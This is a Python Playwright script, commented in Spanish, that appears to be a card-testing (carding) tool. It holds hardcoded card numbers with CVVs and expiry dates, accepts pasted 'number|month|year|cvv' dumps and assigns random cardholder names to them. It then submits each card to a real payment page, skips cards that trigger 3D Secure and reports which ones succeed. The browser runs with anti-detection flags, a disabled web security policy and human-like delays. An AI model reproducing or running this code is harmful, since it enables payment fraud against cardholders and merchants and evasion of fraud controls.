from playwright.sync_api import sync_playwright, expect
import random
import time
import logging
import os
from datetime import datetime

# Lista de tarjetas a procesar
TARJETAS = [
    {
        "numero": "4349250487781661",
        "cvv": "386",
        "mes": "1",
        "anio": "2030",
        "titular": "JUAN PEREZ"
    },
    {
        "numero": "4349250487781646",
        "cvv": "831",
        "mes": "1",
        "anio": "2030",
        "titular": "CARLOS RODRIGUEZ"
    },
    {
        "numero": "4349250487787346",
        "cvv": "936",
        "mes": "1",
        "anio": "2030",
        "titular": "MARIA GONZALES"
    },
    {
        "numero": "4349250487783253",
        "cvv": "713",
        "mes": "1",
        "anio": "2030",
        "titular": "PEDRO MARTINEZ"
    },
    {
        "numero": "4349250487788708",
        "cvv": "833",
        "mes": "1",
        "anio": "2030",
        "titular": "ANA TORRES"
    },
    {
        "numero": "44349250487788658",
        "cvv": "558",
        "mes": "1",
        "anio": "2030",
        "titular": "LUIS SANCHEZ"
    },
    {
        "numero": "4349250487323258",
        "cvv": "658",
        "mes": "1",
        "anio": "2030",
        "titular": "ROSA FLORES"
    },
    {
        "numero": "4349250487794037",
        "cvv": "537",
        "mes": "1",
        "anio": "2030",
        "titular": "MIGUEL CASTRO"
    },
    {
        "numero": "4349250487082458",
        "cvv": "758",
        "mes": "1",
        "anio": "2030",
        "titular": "CARMEN DIAZ"
    },
    {
        "numero": "4349250487332556",
        "cvv": "856",
        "mes": "1",
        "anio": "2030",
        "titular": "JOSE RAMIREZ"
    },
    {
        "numero": "4349250487787916",
        "cvv": "816",
        "mes": "1",
        "anio": "2030",
        "titular": "PATRICIA VARGAS"
    }
]

# Segunda lista de tarjetas
TARJETAS_2 = [
    {
        "numero": "4349250487329108",
        "cvv": "123",
        "mes": "1",
        "anio": "2030",
        "titular": "ROBERTO GOMEZ"
    },
    {
        "numero": "4349250487567426",
        "cvv": "456",
        "mes": "1",
        "anio": "2030",
        "titular": "LAURA MARTINEZ"
    }
]

# Lista de nombres y apellidos para generar titulares al azar
NOMBRES = [
    "JUAN", "MARIA", "CARLOS", "ANA", "LUIS", "ROSA", "PEDRO", "CARMEN", "JOSE", "PATRICIA",
    "MIGUEL", "LAURA", "FRANCISCO", "ISABEL", "ALBERTO", "SOFIA", "ROBERTO", "LUCIA", "JORGE", "PAULA",
    "DANIEL", "ANDREA", "MANUEL", "CAROLINA", "RICARDO", "BEATRIZ", "EDUARDO", "SILVIA", "FERNANDO", "MONICA"
]

APELLIDOS = [
    "GARCIA", "RODRIGUEZ", "MARTINEZ", "LOPEZ", "GONZALEZ", "PEREZ", "SANCHEZ", "RAMIREZ", "TORRES", "FLORES",
    "DIAZ", "REYES", "MORALES", "CASTRO", "ORTIZ", "RAMOS", "ROMERO", "ALVAREZ", "RIVERA", "RUIZ",
    "JIMENEZ", "HERNANDEZ", "MEDINA", "VARGAS", "MORENO", "CRUZ", "QUINTERO", "HERRERA", "SILVA", "ROJAS"
]

# Configurar el sistema de logging
def setup_logger():
    # Crear directorio de logs si no existe
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Configurar el nombre del archivo de log con timestamp
    log_filename = f'logs/debug_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
    
    # Configurar el logger
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(log_filename),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger('AutoPago')

def delay_aleatorio(min_segundos=0.1, max_segundos=0.3):
    delay = random.uniform(min_segundos, max_segundos)
    logger.debug(f'Esperando {delay:.2f} segundos')
    time.sleep(delay)

def simular_escritura_humana(page, selector, texto):
    try:
        logger.debug(f'Intentando escribir en el campo {selector}')
        elemento = page.locator(selector)
        elemento.click()
        
        # Escribir el texto más rápido
        elemento.fill(texto)
        delay_aleatorio(0.1, 0.2)
        
        logger.debug(f'Texto completo "{texto}" escrito exitosamente en {selector}')
    except Exception as e:
        logger.error(f'Error al escribir en {selector}: {str(e)}')
        raise

def procesar_tarjeta(page, tarjeta, num_tarjeta):
    try:
        logger.info(f'Procesando tarjeta {num_tarjeta} - Titular: {tarjeta["titular"]}')
        
        # Hacer clic en el botón de VISA más rápido
        logger.info('Intentando hacer clic en el botón de VISA')
        try:
            boton_visa = page.locator("span.imgElt:has(img[alt='VISA'])")
            logger.debug('Botón VISA encontrado')
            boton_visa.click()
            delay_aleatorio(0.2, 0.4)
        except Exception as e:
            logger.error(f'Error al hacer clic en VISA: {str(e)}')
            return False

        # Esperar a que la página esté lista (reducimos los timeouts)
        logger.debug('Esperando a que los elementos del formulario estén disponibles')
        page.wait_for_selector("#fCardNumber", state="visible", timeout=5000)
        page.wait_for_selector("#vads-expiry-month-input", state="visible", timeout=5000)
        page.wait_for_selector("#vads-expiry-year-input", state="visible", timeout=5000)
        page.wait_for_selector("#cvvid", state="visible", timeout=5000)
        page.wait_for_selector("[name='vads_card_holder_name']", state="visible", timeout=5000)
        delay_aleatorio(0.2, 0.4)

        # Rellenar campos más rápido
        simular_escritura_humana(page, "#fCardNumber", tarjeta["numero"])
        delay_aleatorio(0.1, 0.2)

        # Seleccionar mes
        page.locator("#vads-expiry-month-input").select_option(tarjeta["mes"])
        delay_aleatorio(0.1, 0.2)

        # Seleccionar año
        page.locator("#vads-expiry-year-input").select_option(tarjeta["anio"])
        delay_aleatorio(0.1, 0.2)

        # Rellenar CVV
        simular_escritura_humana(page, "#cvvid", tarjeta["cvv"])
        delay_aleatorio(0.1, 0.2)

        # Rellenar titular
        simular_escritura_humana(page, "[name='vads_card_holder_name']", tarjeta["titular"])
        delay_aleatorio(0.1, 0.2)

        # Hacer clic en validar
        logger.info('Preparando clic en botón de validación')
        boton_validar = page.locator("#validationButtonCard")
        boton_validar.click()
        logger.info('Formulario enviado')

        # Esperar y verificar respuesta
        print(f"\n⚠️ Verificando respuesta del servidor ⚠️")
        print(f"Número: {tarjeta['numero']}")
        print(f"Titular: {tarjeta['titular']}")
        
        try:
            # Dar tiempo para que la página responda
            time.sleep(2)
            
            # Verificar si hay mensaje de error
            error = page.locator(".error-message, .alert-danger").is_visible(timeout=3000)
            if error:
                mensaje_error = page.locator(".error-message, .alert-danger").text_content()
                print(f"\n❌ Error detectado: {mensaje_error}")
                time.sleep(1)  # Breve pausa para ver el error
                return False
                
            # Verificar si aparece 3D Secure
            iframe_3d = page.locator('iframe[data-test="LYRA-INSTRUCTION-IFRAME"]').is_visible(timeout=3000)
            if iframe_3d:
                print("\n🔒 3D SECURE DETECTADO - Saltando a siguiente tarjeta")
                time.sleep(1)  # Breve pausa para ver el mensaje
                return False
                
            # Verificar si hay éxito
            exito = page.locator(".success-message, .alert-success").is_visible(timeout=3000)
            if exito:
                mensaje_exito = page.locator(".success-message, .alert-success").text_content()
                print(f"\n✅ Éxito: {mensaje_exito}")
                time.sleep(1)  # Breve pausa para ver el éxito
                return True
            
            # Si no se detectó nada específico
            print("\n⏳ Sin respuesta clara - Continuando...")
            time.sleep(1)
            return False
            
        except Exception as e:
            logger.error(f'Error verificando respuesta: {str(e)}')
            print("\n⚠️ No se pudo determinar el resultado - Continuando...")
            time.sleep(1)
            return False

    except Exception as e:
        logger.error(f'Error procesando tarjeta: {str(e)}')
        return False

# Función para procesar texto de tarjetas
def procesar_texto_tarjetas(texto):
    tarjetas = []
    lineas = texto.strip().split('\n')
    
    for linea in lineas:
        if '|' not in linea:
            continue
            
        partes = linea.strip().split('|')
        if len(partes) >= 4:
            numero, mes, anio, cvv = partes[:4]
            # Eliminar espacios en blanco
            numero = numero.strip()
            mes = mes.strip()
            anio = anio.strip()
            cvv = cvv.strip()
            
            # Convertir el mes de "01" a "1"
            mes = str(int(mes))
            
            # Convertir año de 2028 a 2028
            if len(anio) == 4:
                anio = anio
            
            # Generar nombre aleatorio
            nombre = random.choice(NOMBRES)
            apellido = random.choice(APELLIDOS)
            titular = f"{nombre} {apellido}"
            
            tarjetas.append({
                "numero": numero,
                "cvv": cvv,
                "mes": mes,
                "anio": anio,
                "titular": titular
            })
    
    return tarjetas

# Función para seleccionar qué lista de tarjetas usar
def seleccionar_lista_tarjetas():
    print("\nSeleccione la lista de tarjetas a procesar:")
    print("1. Lista principal (11 tarjetas)")
    print("2. Lista secundaria (2 tarjetas)")
    print("3. Ingresar tarjetas en formato texto (número|mes|año|cvv)")
    while True:
        try:
            opcion = input("Ingrese el número de la lista (1, 2 o 3): ")
            if opcion == "1":
                return TARJETAS
            elif opcion == "2":
                return TARJETAS_2
            elif opcion == "3":
                print("\nPegue las tarjetas en formato: número|mes|año|cvv")
                print("Una tarjeta por línea. Presione Enter y luego Ctrl+D (Linux/Mac) o Ctrl+Z (Windows) cuando termine:")
                texto_tarjetas = ""
                try:
                    while True:
                        linea = input()
                        texto_tarjetas += linea + "\n"
                except (EOFError, KeyboardInterrupt):
                    pass
                
                nuevas_tarjetas = procesar_texto_tarjetas(texto_tarjetas)
                if nuevas_tarjetas:
                    print(f"\nSe procesarán {len(nuevas_tarjetas)} tarjetas")
                    return nuevas_tarjetas
                else:
                    print("No se encontraron tarjetas válidas. Intente de nuevo.")
            else:
                print("Por favor, ingrese 1, 2 o 3")
        except ValueError:
            print("Por favor, ingrese un número válido")

def automatizar_pago():
    logger.info('Iniciando proceso de automatización de pago')
    
    # Seleccionar lista de tarjetas
    tarjetas_seleccionadas = seleccionar_lista_tarjetas()
    logger.info(f'Se seleccionó lista con {len(tarjetas_seleccionadas)} tarjetas')
    
    with sync_playwright() as p:
        try:
            # Configuración avanzada del navegador
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            logger.debug(f'User Agent configurado: {user_agent}')
            
            # Inicia un navegador con configuración anti-detección
            logger.debug('Iniciando navegador con configuración anti-detección')
            browser = p.chromium.launch(
                headless=False,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-automation',
                    '--disable-dev-shm-usage',
                    '--no-sandbox',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    f'--user-agent={user_agent}'
                ]
            )
            logger.info('Navegador iniciado correctamente')
            
            # Configuración detallada del contexto
            logger.debug('Configurando contexto del navegador')
            context = browser.new_context(
                viewport={'width': 640, 'height': 480},
                user_agent=user_agent,
                extra_http_headers={
                    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-ch-ua': '"Chromium";v="122", "Google Chrome";v="122", "Not(A:Brand";v="24"',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-mobile': '?0',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                },
                java_script_enabled=True,
                bypass_csp=True,
                ignore_https_errors=True
            )
            logger.info('Contexto del navegador configurado correctamente')

            # Procesar cada tarjeta
            for idx, tarjeta in enumerate(tarjetas_seleccionadas, 1):
                logger.info(f'\n=== Procesando tarjeta {idx} de {len(tarjetas_seleccionadas)} ===')
                print(f'\nProcesando tarjeta {idx} de {len(tarjetas_seleccionadas)} - Titular: {tarjeta["titular"]}')
                
                # Crear nueva página para cada tarjeta
                page = context.new_page()
                
                try:
                    # Navegar a la página
                    response = page.goto(
                        "https://secure.micuentaweb.pe/t/7n9fxhrw",
                        wait_until="networkidle",
                        timeout=60000
                    )
                    
                    if response.status != 200:
                        logger.error(f'Error de página: {response.status}')
                        continue

                    # Procesar la tarjeta
                    resultado = procesar_tarjeta(page, tarjeta, idx)
                    
                    if resultado:
                        logger.info(f'Tarjeta {idx} procesada exitosamente')
                    else:
                        logger.error(f'Error procesando tarjeta {idx}')
                    
                    # Cerrar la página actual
                    page.close()
                    
                    # Esperar entre tarjetas
                    if idx < len(tarjetas_seleccionadas):
                        tiempo_espera = random.randint(2, 4)
                        logger.info(f'Esperando {tiempo_espera} segundos antes de la siguiente tarjeta...')
                        time.sleep(tiempo_espera)
                
                except Exception as e:
                    logger.error(f'Error en el proceso de la tarjeta {idx}: {str(e)}')
                    page.close()
                    continue

            logger.info('Proceso de todas las tarjetas completado')
            browser.close()

        except Exception as e:
            logger.error(f'Error inesperado: {str(e)}')
            raise

# Configurar logger global
logger = setup_logger()

# Ejecuta la función
if __name__ == "__main__":
    logger.info('=== INICIANDO NUEVA EJECUCIÓN ===')
    try:
        automatizar_pago()
    except Exception as e:
        logger.error(f'Error fatal en la ejecución: {str(e)}')
    logger.info('=== FIN DE LA EJECUCIÓN ===')